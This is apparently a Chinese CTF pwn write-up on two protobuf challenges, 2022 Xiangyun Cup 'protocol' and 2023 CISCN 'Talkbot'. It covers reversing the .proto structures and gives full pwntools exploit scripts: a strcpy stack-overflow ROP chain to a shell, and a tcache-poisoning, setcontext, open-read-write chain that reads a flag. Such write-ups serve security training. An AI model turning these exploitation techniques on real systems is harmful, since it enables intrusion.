## **Protobuf是什么？**

> Protobuf是一种 **高效的数据压缩编码方式** ，可用于通信协议，数据存储等
>
> 它由一种用于声明数据结构的语言组成，然后根据目标实现将其编译为代码或另一种结构
>
> 一旦定义了要处理的数据的数据结构之后，就可以利用 Protocol buffers 的代码生成工具生成相关的代码
>
> 甚至可以在无需重新部署程序的情况下更新数据结构
>
> 只需使用 Protobuf 对数据结构进行一次描述，即可利用各种不同语言或从各种不同数据流中对你的结构化数据轻松读写
>
> [Protocol Buffers官方文档(开发指南) - 银魔术师 - 博客园
> (cnblogs.com)](https://www.cnblogs.com/silvermagic/p/9087593.html)
>
> [高效的数据压缩编码方式 Protobuf-腾讯云开发者社区-腾讯云
> (tencent.com)](https://cloud.tencent.com/developer/article/1199069)

‍

‍

## 2022祥云杯 protocol

程序为protobuf文件，且去了符号表

​  
![](./img/154389652429592254.png)

​​  
![](./img/5891697434320080224.png)  
​​

‍

#### 前期准备：

###### 导入sig签名文件

查看程序编译的环境，以重新导入一个sig

    
    
    strings -tx pwn | grep "GCC"
    

​  
![](./img/5026352807829768011.png)  
​

**sig-database签名文件的库：**

找到版本相匹配的签名文件

[GitHub - push0ebp/sig-database: IDA FLIRT Signature
Database](https://github.com/push0ebp/sig-database)

​​  
![](./img/2301901351089924014.png)  
​​

下载后放入所使用的IDA的`/sig/pc`​目录下

​  
![](./img/416032509314932718.png)

然后在IDA里添加上： **文件/加载文件/FLIRT签名文件/libc6_2.31-0ubuntu9.4_amd64.sig**

​  
![](./img/7962834284157796966.png)

‍

###### 静态 **分析：**

​  
![](./img/3422579438653351512.png)  
​

定位到main函数

![](./img/6854300357930963459.png)  
​

    
    
    __int64 __fastcall sub_4075DB()
    {
      unsigned int v0; // r12d
      int v1; // ebx
      _QWORD *v2; // rax
      int v3; // ebx
      __int64 v4; // rax
      __int64 v5; // rax
      __int64 v6; // rax
      __int64 v7; // rax
      _QWORD *v8; // rax
      _QWORD *v9; // rax
      char v11[48]; // [rsp+10h] [rbp-270h] BYREF
      char v12[256]; // [rsp+40h] [rbp-240h] BYREF
      char v13[256]; // [rsp+140h] [rbp-140h] BYREF
      char v14[47]; // [rsp+240h] [rbp-40h] BYREF
      char v15[17]; // [rsp+26Fh] [rbp-11h] BYREF
    
      while ( 1 )
      {
        sub_4078AC(v11);
        sub_60F980(qword_81D1A0, (__int64)"Login: ");
        j_memset_ifunc(&unk_81A360, 0LL, 4096LL);
        _libc_read(0LL, &unk_81A360, 4096LL);
        _cyg_profile_func_enter_6(v15);
        sub_625110(v14, &unk_81A360, v15);
        v1 = sub_416316(v11, v14) ^ 1;
        sub_622A70(v14);
        _cyg_profile_func_enter_8(v15);
        if ( (_BYTE)v1 )
        {
          v2 = sub_60F980(qword_81D1A0, (__int64)"ParseFromString Fail!");
          sub_60E4F0(v2, sub_60F2B0);
          v0 = -1;
          v3 = 0;
        }
        else
        {
          v4 = sub_4078D6(v11);
          v5 = sub_624340(v4);
          j_strcpy_ifunc(v13, v5);
          v6 = sub_4078F4(v11);
          v7 = sub_624340(v6);
          j_strcpy_ifunc(v12, v7);
          if ( (unsigned int)j_strcmp_ifunc(v13, "admin") || (unsigned int)j_strcmp_ifunc(v12, "admin") )
          {
            v9 = sub_60F980(qword_81D1A0, (__int64)"Login Fail!");
            sub_60E4F0(v9, sub_60F2B0);
            v3 = 2;
          }
          else
          {
            v8 = sub_60F980(qword_81D1A0, (__int64)"Login Success!");
            sub_60E4F0(v8, sub_60F2B0);
            v3 = 1;
          }
        }
        sub_40504C(v11);
        if ( !v3 )
          break;
        if ( v3 != 2 )
        {
          sub_41799E(v11);
          return 0;
        }
      }
      return v0;
    }
    

漏洞点在strcpy函数，存在栈溢出，偏移为0x148和0x248

​​  
![](./img/8611758763248444463.png)  
​

‍

‍

###### protobuf安装

<https://github.com/protocolbuffers/protobuf/releases>

下载并安装protobuf，注意需要 **root** 权限，尽量直接在root账户下操作

    
    
    tar -xzvf protobuf-cpp-3.21.9.tar.gz
    cd protobuf-3.21.9
    ./autogen.sh
    ./configure --prefix=/usr/local/protobuf
    make -j8 && make install
    ldconfig
    

‍

    
    
    sudo vim /etc/profile
    # 在/etc/profile文件中添加下面两行
    export PATH=$PATH:/usr/local/protobuf/bin/
    export PKG_CONFIG_PATH=/usr/local/protobuf/lib/pkgconfig/
    # 然后执行
    source /etc/profile
    

‍

    
    
    sudo vim /etc/ld.so.conf
    # 在文件/etc/ld.so.conf中添加下面一行
    /usr/local/protobuf/lib #（注意: 在新行处添加）
    
    # 更改完成之后执行下面的命令
    ldconfig
    

‍

###### pbkt安装

可以手搓逆向出来.proto文件，也可以直接利用pbkt自动化提取：

[GitHub - marin-m/pbtk: 基于 Protobuf
的用于逆向工程和模糊测试的应用程序工具集](https://github.com/marin-m/pbtk)

工具的安装可真是麻烦，我在ubuntu20.04下安装也是一堆报错

后来根据nqoinaen师傅的博客，将原来官方文档中的openjdk-9-jre改成openjdk-11-jre，安装成功

    
    
    $ sudo apt install python3-pip git openjdk-11-jre libqt5x11extras5 python3-pyqt5.qtwebengine python3-pyqt5
    
    $ sudo pip3 install protobuf pyqt5 pyqtwebengine requests websocket-client
    
    $ git clone https://github.com/marin-m/pbtk
    
    $ cd pbtk
    
    $ ./gui.py
    

点击第一个选项

![](./img/2229710865604450040.png)  
​

这里选择我们的要分析程序，双击文件选择

​  
![](./img/8259314583778112870.png)  
​

​  
![](./img/1382508247259072832.png)  
​

虽然但是..这样并没有找到这个生成的ctf.proto文件

我们通过执行下面的命令来获取ctf.proto文件

    
    
    pip install protobuf
    #脚本可以在没有 GUI 的情况下独立使用：
    #./extractors/from_binary.py [-h] input_file [output_dir]
    ./extractors/from_binary.py ./pwn ~/ppp
    

​  
![](./img/6530707555576143679.png)  
​

‍

输入命令，编译出ctf_pb2.py文件

    
    
    pip install google
    pip install protobuf
    protoc --python_out=./ ./ctf.proto
    

​​  
![](./img/2808284543967158551.png)  
​

    
    
    #ctf.proto文件
    
    syntax = "proto2";
    
    package ctf;
    
    message pwn {
        optional bytes username = 1;
        optional bytes password = 2;
    }
    

‍

将我们编译出的python文件作为库导入 **import ctf_pb2**

注意要和exp在同一目录下

‍

#### exp：

由于strcpy遇到\x00会截断，所以构造函数的时候要倒着写

简单来说就是利用strcpy结尾会自动补充\x00的特性来给rdi寄存器赋值

    
    
    # encoding = utf-8
    from pwn import *
    import ctf_pb2 
    
    context.os = 'linux'
    context.arch = 'amd64'
    # context.arch = 'i386'
    context.log_level = "debug"
    
    name = './pwn'
    
    debug = 0
    if debug:
        p = remote('127.0.0.1',8000)
    else:
        p = process(name)
    
    libcso = '/lib/x86_64-linux-gnu/libc.so.6'
    libc = ELF(libcso)
    elf = ELF(name)
    
    s       = lambda data               :p.send(data)
    sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
    sl      = lambda data               :p.sendline(data)
    sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
    r       = lambda num                :p.recv(num)
    ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
    itr     = lambda                    :p.interactive()
    uu32    = lambda data,num           :u32(p.recvuntil(data)[-num:].ljust(4,b'\x00'))
    uu64    = lambda data,num           :u64(p.recvuntil(data)[-num:].ljust(8,b'\x00'))
    leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
    l64     = lambda      :u64(p.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
    l32     = lambda      :u32(p.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
    li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
    ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')
    context.terminal = ['gnome-terminal','-x','sh','-c']
    
    def dbg():
       gdb.attach(proc.pidof(p)[0])
       pause()
    
    pop_rdi=0x0000000000404982
    pop_rsi=0x0000000000588bbe
    pop_rdx=0x000000000040454f
    pop_rax=0x00000000005bdb8a
    syscall = elf.search(asm('syscall\nret')).__next__()
    
    def send_payload(username = b'admin', password = b'admin'):
        d = ctf_pb2.pwn()
        d.username = username
        d.password = password
        strs = d.SerializeToString()
        p.sendafter(b'Login: ',strs)
    
    def p1(offest, p):
        for i in range(8):
            send_payload(b'a' * (offest + 7 - i))
        send_payload(b'a' * offest + p64(p)[:3])
    
    def p2(offest):
        for i in range(8):
            send_payload(b'a' * (offest + 7 - i))
    
    bss = elf.bss()
    li('bss = '+hex(bss))
    
    p1(0x1c0, syscall)
    p2(0x1b8)
    p1(0x1b0, pop_rdx)
    p2(0x1a8)
    p1(0x1a0, pop_rsi)
    p1(0x198, bss)
    p1(0x190, pop_rdi)
    
    for i in range(8):
        send_payload(b'a' * (0x188 + 7 - i))
    send_payload(b'a' * 0x188 + p64(0x3b)[:1])
    
    p1(0x180, pop_rax)
    
    p1(0x178, syscall)
    
    for i in range(8):
        send_payload(b'a' * (0x170 + 7 - i))
    send_payload(b'a' * 0x170 + p64(0x50)[:1])
    
    p1(0x168, pop_rdx)
    p1(0x160, bss)
    p1(0x158, pop_rsi)
    p2(0x150)
    p1(0x148, pop_rdi)
    
    send_payload()
    s('/bin/sh\x00')
    
    
    itr()
    

出现报错

​  
![](./img/5761779215226260046.png)

**报错主要是因为protobuf的版本太高而导致编译错误，我们只需要更改protobuf版本到3.19.0即可**

    
    
    pip install protobuf==3.19.0
    

​​  
![](./img/7904875979530777520.png)  
​​

‍

‍

## 2023 **ciscn初赛 ​** Talkbot

​  
![](./img/287440418397042378.png)  
​

​  
![](./img/6694249577427341540.png)  
​

cy里面就是1200行需要逆向的代码

**堆菜单界面：**

​  
![](./img/1749120375364471231.png)

思路就是2.31版本下的UAF利用

‍

**ctf.proto文件**

原件直接利用pbtk是无法识别的，出题人抹除了protobuf的标志，但里面有相关结构体的定义

大能猫✌搭配GPT用4h逆了1200行代码，再进行的手修 orz

    
    
    #ctf.proto
    
    syntax = "proto2";
    
    package Devicemsg;
    
    message parse_member {
        optional int64 actionid = 1;
        optional int64 msgidx = 2;
        optional int64 msgsize = 3;
        optional bytes msgcontent = 4; 
    }
    

‍  
也可以直接用Nova师傅写的工具生成 Protobuf 序列化字节，就不用再手撸了

[GitHub - Nova-Noir/PwnUtils: A collection of useful pwn scripts in
one.](https://github.com/Nova-Noir/PwnUtils)

‍

##### 利用详解：

    
    
    for i in range(1, 10): #9
        add(i, 0xf0, b'c'*0xf0)
    
    for i in range(1, 9): #8
        delete(i)
    

一次会申请两个大小相同的chunk，占两个idx

程序还会自动生成一个0x50大小的chunk

​  
![](./img/7304233456083871676.png)  
​

    
    
    show(8)
    
    heap = uu64(ru('cccccccc')[-8:]) - 0x1470
    leak('heap',heap)
    libcbase = uu64(ru('\x7f')[-5:]+b'\x7f') -0x1ecb00
    leak('libc',libcbase)
    

show会产生0x20大小的chunk

​  
![](./img/1361248006407296017.png)

直接打tcache posioning

    
    
    add(10, 0x20, b'a')
    

​​  
![](./img/3133855281807737457.png)

    
    
    add(11, 0x20, b'a')
    

​  
![](./img/8459928975424546737.png)

    
    
    delete(11)
    
    delete(10)
    
    edit(10, 1,p64(free_hook - 8))
    

​  
![](./img/2791024600249198733.png)  
​

    
    
    add(12, 0x20, b'a')
    
    pl = b'\x00'*8 + p64(mg)
    add(13, 0x20, pl)
    
    flag = heap + 0x2088
    buf = heap + 0x3000
    
    pl = p64(heap + 0x1e20)*2 + p64(setcontext)*4
    pl = pl.ljust(0xa0, b'\x00')
    pl += p64(heap + 0x640) + p64(ret)
    add(14, 0xc0, pl)
    
    orw = p64(rdi) + p64(flag) + p64(rsi) + p64(0) + p64(rdx) + p64(0) + p64(opent)
    orw += p64(rdi) + p64(3) + p64(rsi) + p64(buf) + p64(rdx) + p64(0x30) + p64(read)
    orw += p64(rdi) + p64(1) + p64(write)
    orw += b'./flag\x00\x00'
    
    edit(2, 1, orw)
    
    delete(14)
    

‍

#### exp：

    
    
    #encoding = utf-8
    import os
    import sys
    import time
    from pwn import *
    from ctf_pb2 import*
    from ctypes import *
    
    context.os = 'linux'
    context.log_level = "debug"
    
    s       = lambda data               :p.send(str(data))
    sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
    sl      = lambda data               :p.sendline(str(data))
    sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
    r       = lambda num                :p.recv(num)
    ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
    itr     = lambda                    :p.interactive()
    uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
    uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
    leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
    context.terminal = ['gnome-terminal','-x','sh','-c']
    
    p = process('./pwn')
    elf = ELF('./pwn')
    libc = ELF('/lib/x86_64-linux-gnu/libc-2.31.so')
    
    def debug():
        gdb.attach(p)
        pause()
    
    def add(idx,size,content):
        p.recvuntil(b'You can try to have friendly communication with me now: ')
        person = parse_member()
        person.actionid = 2 #1
        person.msgidx = idx*2
        person.msgsize = size*2
        person.msgcontent = content
        p.send(person.SerializeToString())
    
    def edit(idx,size,content):
        p.recvuntil(b'You can try to have friendly communication with me now: ')
        person = parse_member()
        person.actionid = 4 #3
        person.msgidx = idx*2
        person.msgsize = size*2
        person.msgcontent = content
        p.send(person.SerializeToString())
    
    
    def show(idx):
        p.recvuntil(b'You can try to have friendly communication with me now: ')
        person = parse_member()
        person.actionid = 6 #3
        person.msgidx = idx*2
        person.msgsize = 0
        person.msgcontent = b"\x00"
        p.send(person.SerializeToString())
    
    def delete(idx):
        p.recvuntil(b'You can try to have friendly communication with me now: ')
        person = parse_member()
        person.actionid = 8 #4
        person.msgidx = idx*2
        person.msgsize = 0
        person.msgcontent = b"\x00"
        p.send(person.SerializeToString())
    
    for i in range(1, 10): #9
        add(i, 0xf0, b'c'*0xf0)
    
    for i in range(1, 9): #8
        delete(i)
    
    show(8)
    
    heap = uu64(ru('cccccccc')[-8:]) - 0x1470
    leak('heap',heap)
    libcbase = uu64(ru('\x7f')[-5:]+b'\x7f') -0x1ecb00
    leak('libc',libcbase)
    
    ret = libcbase + 0x22679
    rdi = libcbase + 0x0000000000023b6a
    rsi = libcbase + 0x000000000002601f
    rdx = libcbase + 0x142c92
    opent = libcbase + libc.sym['open']
    read = libcbase + libc.sym['read']
    write = libcbase + libc.sym['write']
    free_hook = libcbase + libc.sym['__free_hook']
    mg = libcbase +  + 0x151990
    setcontext = libcbase + libc.sym['setcontext'] + 61
    
    add(10, 0x20, b'a')
    
    add(11, 0x20, b'a')
    
    delete(11)
    
    delete(10)
    
    edit(10, 1,p64(free_hook - 8))
    
    add(12, 0x20, b'a')
    
    pl = b'\x00'*8 + p64(mg)
    add(13, 0x20, pl)
    
    flag = heap + 0x2088
    buf = heap + 0x3000
    
    pl = p64(heap + 0x1e20)*2 + p64(setcontext)*4
    pl = pl.ljust(0xa0, b'\x00')
    pl += p64(heap + 0x640) + p64(ret)
    add(14, 0xc0, pl)
    
    orw = p64(rdi) + p64(flag) + p64(rsi) + p64(0) + p64(rdx) + p64(0) + p64(opent)
    orw += p64(rdi) + p64(3) + p64(rsi) + p64(buf) + p64(rdx) + p64(0x30) + p64(read)
    orw += p64(rdi) + p64(1) + p64(write)
    orw += b'./flag\x00\x00'
    
    edit(2, 1, orw)
    
    delete(14)
    
    
    itr()
    

‍

#### 参考：

大能猫✌带带我

[protobuf-c 基本使用及样例_protobufcmessage_vegeta852的博客-CSDN博客](https://blog.csdn.net/vegeta852/article/details/111935914)

[【祥云杯2022】PWN-WriteUp-protocol - 鷺雨のBlog
(loora1n.github.io)](https://loora1n.github.io/2022/11/01/%E3%80%90%E7%A5%A5%E4%BA%91%E6%9D%AF2022%E3%80%91PWN-WriteUp-protocol/)

[祥云杯2022 pwn - protocol_z1r0.的博客-CSDN博客](https://blog.csdn.net/zzq487782568/article/details/127778545)

[「PWN」【第十六届全国大学生信息安全竞赛 CISCN 初赛】Writeup WP 复现 | ネコのメモ帳
(ova.moe)](https://n.ova.moe/reproducing/2023/05/28/CISCN2023_Pre/#talkbot)

